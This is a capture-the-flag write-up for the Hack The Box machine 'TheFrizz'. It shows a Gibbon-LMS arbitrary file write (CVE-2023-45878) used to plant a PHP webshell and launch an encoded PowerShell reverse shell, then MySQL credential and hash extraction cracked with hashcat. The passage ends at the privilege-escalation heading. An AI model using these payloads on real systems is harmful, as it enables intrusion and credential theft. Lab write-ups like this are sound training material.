---
title: "TheFrizz"
date: 2026-02-10
categories: [HTB]
tags: [windows, active-directory]
toc: true

image:
  path: /assets/img/htb/thefrizz/thefrizzmain.png
  alt: "TheFrizz"
---

TheFrizz is a retired Windows Server 2022 AD box chaining a Gibbon-LMS arbitrary file write (CVE-2023-45878) into webshell RCE, credential discovery, Kerberos-based domain access, and GPO permission abuse to reach Domain Admin.

---

## Recon
### Nmap — Port Discovery
Begin with a full TCP sweep to identify all open ports on the target.  
`sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`
![](/assets/img/htb/thefrizz/thefrizz1.png)

Parse the results to store all open ports in a variable for follow-up scanning.  
`ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`
![](/assets/img/htb/thefrizz/thefrizz5.png)

---

### Nmap — Service Enumeration
Run a targeted service and script scan against only the discovered open ports.  
`sudo nmap -p $ports -sC -sV -Pn --min-rate 500 10.129.232.168 -oN scans/service_enum.txt`
![](/assets/img/htb/thefrizz/thefrizz2.png)

---

### DNS/Host Resolution
Add `frizz.htb` and `frizzdc.frizz.htb` to `/etc/hosts` to enable proper name resolution.  
`echo '10.129.18.74 thefrizz.htb' | sudo tee -a /etc/hosts`
![](assets/img/htb/thefrizz/thefrizz3.png)
`echo '10.129.232.168 frizzdc.frizz.htb' | sudo tee -a /etc/hosts`
![](assets/img/htb/thefrizz/thefrizz44.png)

---

## SMB 445, 139
Nmap shows message signing enabled and required. `nxc` confirms SMBv1 is disabled and NTLM authentication is not accepted. Quick null and guest checks both fail, indicating valid domain credentials are required before SMB enumeration is possible.
![](assets/img/htb/thefrizz/thefrizz99.png)

---

## Web Enumeration (Port 80)
### Initial Access to the Web App
Browsing to port 80 presents a public “Walkerville Elementary School” site. The Staff Login link redirects to a Gibbon-LMS instance hosted on the same server.
![](assets/img/htb/thefrizz/thefrizz6.png)
![](assets/img/htb/thefrizz/thefrizz7.png)

---

### Directory Brute Force
Ran gobuster against the Gibbon-LMS directory to identify hidden endpoints or misconfigurations.
No additional interesting directories or files were discovered. Enumeration shifts to application-level vulnerabilities.  
`gobuster dir -u http://frizzdc.frizz.htb/Gibbon-LMS -w /home/user/tools/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php`
![](assets/img/htb/thefrizz/thefrizz8.png)

---

## Initial Access (Web → RCE)
### CVE-2023-45878 — Gibbon-LMS Arbitrary File Write  
The Gibbon-LMS instance is vulnerable to CVE-2023-45878, allowing arbitrary file write via a base64 image upload endpoint.
Minimal PHP webshell:  
`echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`

The endpoint expects base64-encoded data, so the file is encoded:  
`b64=$(base64 -w0 shell.php)`
![](assets/img/htb/thefrizz/thefrizz12.png)

The vulnerable endpoint allows writing arbitrary content to disk.  
`curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d "img=image/png;asdf,${b64}" -d "path=shell.php" -d "gibbonPersonID=0000000001"`
![](assets/img/htb/thefrizz/thefrizz14.png)

Parameter breakdown:
* `img=image/png;asdf,${b64}`
    The server splits on the comma and base64-decodes the right side, writing it to disk.
* `path=shell.php`
    Controls the output filename. No extension restriction allows `.php`.
* `gibbonPersonID=0000000001`
    Required application field influencing save location.
  Successful upload returns the filename:  `shell.php%`

Verify remote code execution
Access the shell directly:
`curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=whoami"`
![](assets/img/htb/thefrizz/thefrizz13.png)
`frizz\w.webservice`
This confirms remote command execution on the web server.

A PowerShell reverse shell payload is delivered via the webshell:

`curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
![](assets/img/htb/thefrizz/thefrizz16.png)

This results in an interactive shell as `w.webservice`
![](assets/img/htb/thefrizz/thefrizz17.png)

## Shell as f.frizzle
### config.php
Searching in the current directory shows a config.php file. Upon inspecting, it shows credentials for mysql.
![](assets/img/htb/thefrizz/configexposure.png)
![](assets/img/htb/thefrizz/mysqlcreds.png)

### MySQL
The MySQL executable is found in the `C:\xampp\mysql\bin` directory. I use this to login and inspect further.

`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"`
![](assets/img/htb/thefrizz/mysql0showdatabases.png)

Database gibbon looks good, so to show tables use:

`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show tables;" gibbon`
![](assets/img/htb/thefrizz/mysql1.png)
![](assets/img/htb/thefrizz/mysql2gibbonperson.png)

Then select all the data from gibbonperson which results in a password hash and salt.

`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;" -E`
![](assets/img/htb/thefrizz/passwordhash.png)

### Hashcat
I use the hashcat examples reference located here https://hashcat.net/wiki/doku.php?id=example_hashes and find out its mode 1420.
![](assets/img/htb/thefrizz/hashcatref.png)

 I echo the hash and salt to a file and run `hashcat` to crack it. 
`echo "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489" > hash.txt`
![](assets/img/htb/thefrizz/hashcatecho.png)
![](assets/img/htb/thefrizz/hashcatcracked.png)


## Privelage Escalation
